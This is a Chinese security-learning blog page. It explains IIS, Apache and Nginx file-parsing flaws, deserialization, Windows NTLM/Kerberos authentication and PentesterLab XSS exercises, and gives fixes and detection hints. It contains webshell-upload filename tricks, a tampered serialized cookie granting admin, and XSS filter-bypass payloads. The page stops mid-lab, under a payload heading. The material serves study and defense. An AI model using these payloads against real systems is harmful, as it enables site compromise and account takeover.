<h2 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤../ ./</span><br><span class="line">配置php.ini文件</span><br><span class="line">都关闭allow_url_fopen 和 allow_url_include</span><br><span class="line">设置白名单</span><br></pre></td></tr></table></figure>

<h2 id="攻击检测方法-6"><a href="#攻击检测方法-6" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>检测是由出现../../这样的路径，</p>
<p>file://伪协议  (读取文件源码)</p>
<p>php://filter/  本地磁盘文件进行读取</p>
<p>php://input</p>
<p>%00截断等</p>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>解析漏洞是指服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。</p>
<h2 id="危害-7"><a href="#危害-7" class="headerlink" title="危害"></a>危害</h2><p>网站会受到攻击，攻击者可以获取后台shell</p>
<h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1、Apache解析漏洞"><a href="#1、Apache解析漏洞" class="headerlink" title="1、Apache解析漏洞"></a>1、Apache解析漏洞</h3><p>在Apache 1.x和Apache 2.x中也存在解析漏洞。</p>
<p>例如：1.php.rar会被当作php文件执行。</p>
<p>Apache在解析文件时有一个原则：按照识别“.”后的扩展名来解析，当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。</p>
<p>例如：1.php.aa.bb.cc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php.aa.bb.cc</span><br></pre></td></tr></table></figure>

<p>会先解析cc，若cc不存在则解析bb，bb不存在则解析aa，aa不存在则只能解析PHP了。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。</p>
<h3 id="2、Nginx-lt-8-03-空字节代码执行漏洞"><a href="#2、Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="2、Nginx &lt;8.03 空字节代码执行漏洞"></a>2、Nginx &lt;8.03 空字节代码执行漏洞</h3><p>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>
<p>当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。</p>
<p>例如：”<a target="_blank" rel="noopener" href="http://127.0.0.1/1.jpg%00.php&quot;%E4%BC%9A%E6%8A%8A1.jpg%E6%96%87%E4%BB%B6%EF%BC%88%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%89%E5%BD%93%E5%81%9APHP%E6%96%87%E4%BB%B6%E6%9D%A5%E6%89%A7%E8%A1%8C%E3%80%82">http://127.0.0.1/1.jpg%00.php&quot;会把1.jpg文件（木马文件）当做PHP文件来执行。</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>

<h3 id="3、IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#3、IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="3、IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a>3、IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h3><p>IIS 7.0/IIS 7.5/ Nginx &lt;8.03在Fast-CGI运行模式下，在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</p>
<p>在某些使用有漏洞的网站中，访问<a target="_blank" rel="noopener" href="http://127.0.0.1/1.jpg/1.php%EF%BC%8C%E6%AD%A4%E6%97%B6%E7%9A%841.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9CPHP%E8%84%9A%E6%9C%AC%E6%9D%A5%E8%A7%A3%E6%9E%90,%E6%AD%A4%E6%97%B61.php%E6%98%AF%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E3%80%82">http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时1.php是不存在的。</a></p>
<p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell，在使用菜刀链接即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg/1.php</span><br></pre></td></tr></table></figure>

<h3 id="4、IIS-5-x-6-0解析漏洞"><a href="#4、IIS-5-x-6-0解析漏洞" class="headerlink" title="4、IIS 5.x/6.0解析漏洞"></a>4、IIS 5.x/6.0解析漏洞</h3><p>在IIS5.X和IIS6.0版本中存在以下两个解析漏洞。</p>
<p><strong>（1）目录解析漏洞</strong></p>
<p>在网站中建立名字为*.asp、*.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p>
<p>例如：创建一个目录test.asp，那么/test.asp/1.jpg将被当做ASP文件来执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xx.asp/xx.jpg</span><br></pre></td></tr></table></figure>


<p><strong>（2）文件解析漏洞</strong></p>
<p>网站上传图片的时候，如果将网页木马文件的名字改成”<em>.asp;1.jpg”，分号后面的不被解析，也就是说，”</em>.asp;1.jpg”会被服务器看成是*.asp，就可以绕过服务器禁止上传ASP文件的限制，这样的畸形文件也同样会被IIS当做ASP文件来解析并执行。</p>
<p>例如：上    传一个图片文件名为”test.asp;1.jpg”的木马文件，该文件可以被当做ASP文件解析并执行。</p>
<p>在IIS6.0版本中，默认可执行文件除了test.asp以外，还包括test.asa、test.cer、test.cdx这三种，同样也存在解析漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.asp;1.jpg</span><br><span class="line">test.asa;1.jpg</span><br><span class="line">test.cer;1.jpg</span><br><span class="line">test.cdx;1.jpg</span><br></pre></td></tr></table></figure>

<h2 id="修复方案-7"><a href="#修复方案-7" class="headerlink" title="修复方案"></a>修复方案</h2><p><strong>IIS 5.x/6.0解析漏洞</strong></p>
<p>1.目前尚无微软官方的补丁,可以通过自己编写正则,阻止上传 xx.asp;.jpg类型<br>的文件名。<br>2.做好权限设置,限制用户创建文件夹。<br>3.针对IIS7.5解析漏洞修复方案,修改php.ini文件,将 cgi.fix_pathinfo的值设置为0完成后请重启PHP和IIS</p>
<p><strong>Apache解析漏洞</strong></p>
<p> 1、apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<p>​    2、用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到#LoadModule rewrite_module</p>
<p>modules/mod_rewrite.so</p>
<p>把 ‘#’ 号去掉，重启apache,在网站根目录下建立 .htaccess 文件,代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<h2 id="攻击检测方法-7"><a href="#攻击检测方法-7" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>查看文件的后缀是否特殊</p>
<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>大部分逻辑缺陷表现为开发者在思考过程中做出的特殊假设存在明显或隐含的错误</p>
<h2 id="修复方案-8"><a href="#修复方案-8" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
<li>确保将应用程序各方面的设计信息都详细的记录在文档中，方便其他人了解设计者做出的每个假设。</li>
<li>要求源代码提供清楚的注释，包括每个代码的组件的用途和预计用法以及每个组件对它无法直接控制的内容做出的假设。</li>
<li>根据会话确定用户的身份和权限，不要根据请求的其他特性对用户的权限做出假设。</li>
</ol>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以</p>
<p>利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
<h2 id="危害-8"><a href="#危害-8" class="headerlink" title="危害"></a>危害</h2><p>可能导致远程代码执行攻击</p>
<h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li><p>php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)，漏洞前提是unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用PHP对象序列化来保存一个“超级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其他状态：</span><br><span class="line">a:4:&#123;i:0;i:132;i:1;s:7:&quot;Mallory&quot;;i:2;s:4:&quot;user&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br><span class="line"></span><br><span class="line">攻击者更改序列化对象以授予自己为admin权限：</span><br><span class="line">a:4:&#123;i:0;i:1;i:1;s:5:&quot;Alice&quot;;i:2;s:5:&quot;admin&quot;;i:3;s:32:&quot;b6a8b3bea87fe0e05022f8f3c88bc960&quot;;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>利用Apache Commons Collections实现远程代码执行，Apache Commons Collections中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、这些应用的反序列化漏洞能够得以利用，就是依靠了Apache Commons Collections。</p>
</li>
<li><p>2017年有报道，黑客利用WebLogic 反序列化漏洞（CVE-2017-3248）和WebLogic WLS 组件漏洞（CVE-2017-10271）对企业服务器发起大范围远程攻击，有大量企业的服务器被攻陷。</p>
</li>
</ul>
<h2 id="修复方案-9"><a href="#修复方案-9" class="headerlink" title="修复方案"></a>修复方案</h2><p>1、php编码中对参数进行处理，使用更安全的函数。</p>
<p>2、限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</p>
<p>3、如果可能，隔离运行那些在低特权环境中反序列化的代码。</p>
<p>4、执行完整性检查，如：任何序列化对象的数字签名，防止恶意对象创建或数据篡改。</p>
<h2 id="攻击检测方法-8"><a href="#攻击检测方法-8" class="headerlink" title="攻击检测方法"></a>攻击检测方法</h2><p>是否出现类似a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}字样</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/Web%E5%BA%94%E7%94%A8%E7%BB%84%E6%88%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/Web%E5%BA%94%E7%94%A8%E7%BB%84%E6%88%90/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-19 09:37:36" itemprop="dateModified" datetime="2021-03-19T09:37:36+08:00">2021-03-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Web应用基本由操作系统、中间件、服务器、数据库等组成</p>
<h2 id="windows-常用版本"><a href="#windows-常用版本" class="headerlink" title="windows 常用版本"></a>windows 常用版本</h2><p><strong>服务器版</strong></p>
<ul>
<li>Windows Server 2003（基于WinXP）</li>
<li>Windows Server 2008（基于WinVista/R2基于Win7）</li>
<li>Windows Server 2012（基于Win8/R2基于Win8.1）</li>
<li>Windows Server 2016（基于Win10 1607）</li>
<li>Windows Server 2019（基于Win10 1809）</li>
</ul>
<p><strong>桌面版</strong></p>
<ul>
<li>Windows 2000</li>
<li>Windows XP</li>
<li>Windows Vista</li>
<li>Windows 7</li>
<li>Windows 8/8.1</li>
<li>Windows 10</li>
</ul>
<h2 id="身份验证-本地认证"><a href="#身份验证-本地认证" class="headerlink" title="身份验证-本地认证"></a>身份验证-本地认证</h2><p>Windows内部是不保存明文密码的，只保存密码的hash。本机用户的密码hash是放在本地的sam文件</p>
<p>域内用户的密码hash是存在域控的NTDS.DIT文件。</p>
<p>SAM文件是位于%SystemRoot%\system32\config\目录下的，用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。</p>
<h2 id="身份验证-NTLM-Hash"><a href="#身份验证-NTLM-Hash" class="headerlink" title="身份验证-NTLM Hash"></a>身份验证-NTLM Hash</h2><blockquote>
<p>早期 SMB协议在 网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为 NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。NTLM是windows早期安全协议，因向后兼容性而保留下来。NTLM是NT LAN Manager的缩写，即NT LAN管理器。</p>
</blockquote>
<p>NTML Hash通常指存储在sam数据库及ntd5数据库中对密码进行hash摘要计算后的结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">验证过程：</span><br><span class="line"><span class="number">1.</span>用户输入username、password、domainname（交互式才需要这个步骤），客户端会计算<span class="built_in">hash</span>值保存在本地；</span><br><span class="line"><span class="number">2.</span>客户端将username明文发给DC；</span><br><span class="line"><span class="number">3.</span>DC生成一个16Byte的随机数（challenge）发送给客户端；</span><br><span class="line"><span class="number">4.</span>客户端通过运算生成一个响应值response=f(hashes,challenge,other)=&gt;other根据版本变化，例如时间戳来防止回访等；</span><br><span class="line"><span class="number">5.</span>客户端将响应值发送给DC；</span><br><span class="line"><span class="number">6.</span>DC经过同样的运算result = f(hashes,challenge,other)，然后比较result和response，一直就验证通过，不一致则验证不通过；</span><br><span class="line"><span class="number">7.</span>备注：目标不一定是DC，<span class="built_in">hash</span>对应的账号所登录的（有缓存的）工作站也可以。</span><br></pre></td></tr></table></figure>

<p>缺陷：可能会受到PTH（Pass-The-Hash），即哈希传递攻击，攻击者攻击了一台主机后，获取了他电脑的hash，然后就可以向同一网段其他主机进行hash的碰撞。若两台电脑密码设置的一样，那么就可以登录另一台主机。</p>
<h2 id="身份验证-NTLM-v2"><a href="#身份验证-NTLM-v2" class="headerlink" title="身份验证-NTLM v2"></a>身份验证-NTLM v2</h2><p>NTLMV2在NTLM里面添加了加密算法。需要在IIS中添加数字证书，在windows2003及以上的版本才支持NTLMV2的单点登录认证。必须通过IIS进行登录认证。</p>
<h2 id="身份验证-Kerberos协议"><a href="#身份验证-Kerberos协议" class="headerlink" title="身份验证-Kerberos协议"></a>身份验证-Kerberos协议</h2><h3 id="主要的三个角色（三只狗）："><a href="#主要的三个角色（三只狗）：" class="headerlink" title="主要的三个角色（三只狗）："></a>主要的三个角色（三只狗）：</h3><ol>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Center) == DC  密钥分发中心<ul>
<li>Authentication Server. ==AS. 身份验证服务</li>
<li>Ticket Granting Server . ==TGS 票据授予服务</li>
</ul>
</li>
</ol>
<h3 id="Kerberos会使用的端口"><a href="#Kerberos会使用的端口" class="headerlink" title="Kerberos会使用的端口"></a>Kerberos会使用的端口</h3><p>TCP和UDP的<strong>88</strong>端口：身份验证和票证授予</p>
<p>TCP和UDP的<strong>464</strong>端口：经典Kerberos Kpaswd（密码重设）协议</p>
<h3 id="验证流程："><a href="#验证流程：" class="headerlink" title="验证流程："></a>验证流程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> client向kerberos服务请求,希望获取访问server的权限。kerberos得到消息后，</span><br><span class="line">	首先会判断client是否为可信赖的。(黑白名单)成功后，AS返回TGT给client 。</span><br><span class="line"><span class="number">2.</span> Client 得到TGT后，继续向kerberos 请求，希望获取访问server的权限。kerberos又得到了这个消息，</span><br><span class="line">	这时候通过client消息中TGT，判断出client拥有了这个权限，返回给client访问server的权限ticket</span><br><span class="line"><span class="number">3.</span> client得到最后的ticket后，就可以访问server了，不过这个ticket只针对这一个server。</span><br><span class="line">大致就是先要获取资格，有资格后才能买票</span><br></pre></td></tr></table></figure>



<h2 id="操作系统-Linux"><a href="#操作系统-Linux" class="headerlink" title="操作系统-Linux"></a>操作系统-Linux</h2><p>个人常见使用的linux：Debian、Ubuntu(基于Debian)、CentOS、Deepin、kali</p>
<h2 id="Web应用组成-开发语言"><a href="#Web应用组成-开发语言" class="headerlink" title="Web应用组成-开发语言"></a>Web应用组成-开发语言</h2><p>开发语言可以分为前端、后端。</p>
<p>前端：</p>
<ul>
<li>HTML</li>
<li>CSS</li>
<li>JavaScript</li>
</ul>
<p>后端：</p>
<ul>
<li>PHP</li>
<li>.NET</li>
<li>JAVA</li>
</ul>
<h2 id="Web应用组成-中间件"><a href="#Web应用组成-中间件" class="headerlink" title="Web应用组成-中间件"></a>Web应用组成-中间件</h2><p>ISS、tomcat、nginx、jboss</p>
<h2 id="Web应用组成-数据库"><a href="#Web应用组成-数据库" class="headerlink" title="Web应用组成-数据库"></a>Web应用组成-数据库</h2><p>SQL Server 、MySQL、Oracle、Redis</p>
<h2 id="Web网站常见架构"><a href="#Web网站常见架构" class="headerlink" title="Web网站常见架构"></a>Web网站常见架构</h2><h3 id="C-S-Client-Server"><a href="#C-S-Client-Server" class="headerlink" title="C/S(Client Server)"></a>C/S(Client Server)</h3><p>C/S架构流程：客户机——经过(Request)请求——服务器(即数据库)——数据库根据客户机的请求——进一步(Response)响应回去给客户机</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/2019061210404542.png" alt="img"></p>
<p>优缺点：C/S结构是一种软件系统体系结构，这种结构是将需要处理的业务合理地分配到客户端和服务器端，这样可以大大降低通信成本，但是升级维护相对困难。比如我们手机中安装的微信、qq、王者荣耀等应用程序就是C/S结构。</p>
<h3 id="B-S-Browser-Server"><a href="#B-S-Browser-Server" class="headerlink" title="B/S(Browser Server)"></a>B/S(Browser Server)</h3><h4 id="B-S架构的三种形式："><a href="#B-S架构的三种形式：" class="headerlink" title="B/S架构的三种形式："></a>B/S架构的三种形式：</h4><ol>
<li>客户端—服务器—数据库（常用模式）</li>
<li>客户端—Web服务器—应用服务器—数据库</li>
<li>客户端—负载均衡器—中间服务器—应用服务器—数据库</li>
</ol>
<h4 id="B-S常用架构流程："><a href="#B-S常用架构流程：" class="headerlink" title="B/S常用架构流程："></a>B/S常用架构流程：</h4><p>​    客户机浏览器——经过Http请求——Web服务器——经过查询——数据库服务器——响应查询后返回结果——Web服务器——再经过Http响应——返回给客户机浏览器</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/20190612104107925.png" alt="在这里插入图片描述"></p>
<p>优缺点：B/S结构是随着互联网的发展，web出现后兴起的一种网络结构模式。这种模式统一了客户端，让核心的业务处理在服务端完成。你只需要在自己电脑或手机上安装一个浏览器，就可以通过web Server与数据库进行数据交互。在手机或电脑上用浏览器上百度搜索、看新闻等就是在使用“B/S”结构进行数据交互。这种“B/S”结构的好处：维护和升级方式更简单，客户端是浏览器，基本不需要维护，只需要维护升级服务器端就可以。</p>
<h3 id="C-S与B-S的结构区别"><a href="#C-S与B-S的结构区别" class="headerlink" title="C/S与B/S的结构区别"></a>C/S与B/S的结构区别</h3><ol>
<li>硬件环境不同，C/S通常是建立在专用的网络上，小范围的网络环境。而B/S是建立在广域网上的，适应范围强，通常有操作系统和浏览器就行；</li>
<li>安全要求不同，C/S结构比B/S结构更安全，因为用户群相对固定，对信息的保护更强；而B/S结构面向的范围广，所以安全性比较低；</li>
<li>系统维护不同，B/S结构维护升级比较简单，而C/S结构维护升级相对困难。</li>
</ol>
<h2 id="Web应用系统开发框架"><a href="#Web应用系统开发框架" class="headerlink" title="Web应用系统开发框架"></a>Web应用系统开发框架</h2><p>Java</p>
<p>SpringBoot</p>
<p>Jboot</p>
<p>PHP</p>
<p>Yi</p>
<p>flask</p>
<h2 id="Web应用内容管理系统"><a href="#Web应用内容管理系统" class="headerlink" title="Web应用内容管理系统"></a>Web应用内容管理系统</h2><p>CMS：ThinkPHP、WordPress、DedeCMS、Weaver（泛微）、Discuz、PHPMyAdmin</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/Pentester%E5%B9%B3%E5%8F%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/Pentester%E5%B9%B3%E5%8F%B0/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-25 09:52:31" itemprop="dateModified" datetime="2021-03-25T09:52:31+08:00">2021-03-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p> <a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/pentesterlab.html#toc-heading-2">https://www.sqlsec.com/2020/05/pentesterlab.html#toc-heading-2</a></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="Example-1-无任何过滤"><a href="#Example-1-无任何过滤" class="headerlink" title="Example 1 无任何过滤"></a>Example 1 无任何过滤</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Example-2-大小写绕过"><a href="#Example-2-大小写绕过" class="headerlink" title="Example 2 大小写绕过"></a>Example 2 大小写绕过</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$name</span> =  <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=&lt;Script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/scripT&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example-3-嵌套绕过"><a href="#Example-3-嵌套绕过" class="headerlink" title="Example 3 嵌套绕过"></a>Example 3 嵌套绕过</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$name</span> =  <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = preg_replace(<span class="string">&quot;/&lt;script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span> = preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;<span class="regexp">/&lt;/</span>script&gt;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Example-4-其他标签绕过"><a href="#Example-4-其他标签绕过" class="headerlink" title="Example 4 其他标签绕过"></a>Example 4 其他标签绕过</h2><p><strong>源码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;../header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/script/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
